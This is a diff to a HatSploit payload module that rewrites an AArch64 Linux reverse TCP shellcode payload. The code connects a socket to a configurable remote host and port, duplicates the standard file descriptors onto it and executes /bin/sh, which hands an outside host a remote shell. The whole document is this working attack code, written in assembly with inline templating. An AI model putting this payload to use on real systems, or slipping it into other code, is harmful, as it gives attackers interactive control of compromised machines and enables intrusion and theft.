@@ -25,49 +25,58 @@ class HatSploitPayload(Payload, Handler, Assembler, Socket):
             'Type': "reverse_tcp",
         })
 
+    def implant(self):
+        return self.assemble(
+            self.details['Arch'],
+            """
+            bl start
+
+            path:
+                .asciz "/bin/sh"
+
+            start:
+                mov x1, 0x3
+                mov x2, 0
+                mov x8, 0x18
+
+            dup:
+                mov x0, x12
+                sub x1, x1, 1
+                svc 0
+                cmp x1, 0
+                bne dup
+
+            shell:
+                adr x0, path
+                mov x1, xzr
+                mov x2, xzr
+                mov x8, 0xdd
+                svc 0
+            """
+        )
+
     def run(self):
         return self.assemble(
             self.details['Arch'],
             f"""
-            start:
-                mov x8, 0xc6
-                lsr x1, x8, 0x7
-                lsl x0, x1, 0x1
-                mov x2, xzr
-                svc 0x1337
+            bl start
 
-                mvn x4, x0
-                lsl x1, x1, 0x1
-                movk x1, 0x{self.rport.little.hex()}, lsl 0x10
-                movk x1, 0x{self.rhost.little[2:].hex()}, lsl 0x20
-                movk x1, 0x{self.rhost.little[:2].hex()}, lsl 0x30
-                str x1, [sp, -8]!
-                add x1, sp, x2
+            addr:
+                .short 0x2
+                .short 0x{self.rport.little.hex()}
+                .word 0x{self.rhost.little.hex()}
+
+            start:
+                mov x0, 0x2
+                mov x1, 0x1
+                mov x2, 0
+                mov x8, 0xc6
+                svc 0
+                mov x12, x0
+
+                adr x1, addr
                 mov x2, 0x10
                 mov x8, 0xcb
-                svc 0x1337
-
-                lsr x1, x2, 0x2
-
-            dup:
-                mvn x0, x4
-                lsr x1, x1, 0x1
-                mov x2, xzr
-                mov x8, 0x18
-                svc 0x1337
-
-                cmp x1, xzr
-                bne dup
-
-                mov x1, 0x622f
-                movk x1, 0x6e69, lsl 0x10
-                movk x1, 0x732f, lsl 0x20
-                movk x1, 0x68, lsl 0x30
-                str x1, [sp, -8]!
-                mov x1, xzr
-                mov x2, xzr
-                add x0, sp, x1
-                mov x8, 0xdd
-                svc 0x1337
+                svc 0
             """
-        )
+        ) + self.implant()
